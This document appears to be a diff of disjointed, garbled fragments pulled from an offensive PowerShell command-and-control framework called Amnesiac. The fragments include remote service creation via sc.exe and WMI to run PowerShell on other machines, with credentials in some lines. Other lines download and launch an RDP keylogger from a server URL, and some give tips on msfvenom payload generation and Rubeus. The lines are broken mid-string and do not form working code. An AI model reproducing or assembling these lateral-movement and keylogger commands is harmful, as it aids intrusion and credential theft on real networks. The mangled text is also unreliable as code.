@@ -1,0 +1,41 @@
+				Start-Process sc.exe
+			# Initialize a mutex to synchronize access to sc.exe
+			$global:FileServerProcess = Start-Process powershell.exe
+			Start-Process powershell.exe
+		Start-Process sc.exe
+	Start-Process powershell.exe
+	Start-Process sc.exe
+ /c powershell.exe
+"					$finalstring =  ""Start-Process powershell.exe"
+"					$finalstring =  ""powershell.exe"
+"					$sw.WriteLine(""Start-Sleep -Seconds 10;sc.exe"
+"				""Start-Process sc.exe"
+"				$sw.WriteLine(""Start-Sleep -Seconds 10;sc.exe"
+"				elseif($command -like ""Migrate2 *""){$finalstring = ""powershell.exe"
+"				if($command -like ""Migrate *""){$finalstring = ""powershell.exe"
+"			$FinalCommand = ""Invoke-WebRequest -Uri '$($global:ServerURL)/RDPKeylog.exe"
+"			$FinalCommand = ""`$process = Start-Process powershell.exe"
+"			$arguments = ""create $ServiceName binpath= `""`""C:\Windows\System32\cmd.exe /c powershell.exe"
+"			$exefilelocation = ""C:\Users\Public\Documents\Amnesiac\Payloads\$($PipeName).exe"
+"			$exescript = ""Start-Process powershell.exe"
+"			$finalstring =  ""Start-Process powershell.exe"
+"			$finalstring =  ""powershell.exe"
+"			Write-Output "" Start-Process powershell.exe"
+"			Write-Output "" powershell.exe"
+"			if($global:Detach){$finalstring = ""powershell.exe"
+"		$exefilelocation = ""C:\Users\Public\Documents\Amnesiac\Payloads\$($global:MultiPipeName).exe"
+"		$exescript = ""Start-Process powershell.exe"
+"		Write-Output "" Start-Process powershell.exe"
+"		Write-Output "" powershell.exe"
+"	        $commandStr = ""powershell.exe"
+"	$arguments = ""\\$ComputerName create $ServiceName binpath= `""C:\Windows\System32\cmd.exe"
+"	$arguments = ""\\$Target create $ServiceName binpath= `""C:\Windows\System32\cmd.exe /c powershell.exe"
+"	Start-Process -FilePath ""powershell.exe"
+"    				""$($global:ServerURL)/RDPKeylog.exe"
+"GQA.....wBlACgAKQA=';Write-Output '';Write-Output '    msfvenom -p windows/x64/exec CMD=`""powershell.exe"
+"e-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList (""powershell.exe"
+"terName $ComputerName -Class Win32_Process -Name Create -Credential $cred -ArgumentList (""powershell.exe"
+' -OutFile 'C:\Users\Public\Documents\RDPLog.exe
+';`$process = Start-Process -FilePath 'C:\Users\Public\Documents\RDPLog.exe
+[+] Tip: How to generate your hex shell code:';Write-Output '';Write-Output '    ShellGen powershell.exe
+s <command>';Write-Output '';Write-Output '    Rubeus createnetonly /program:c:\windows\system32\cmd.exe
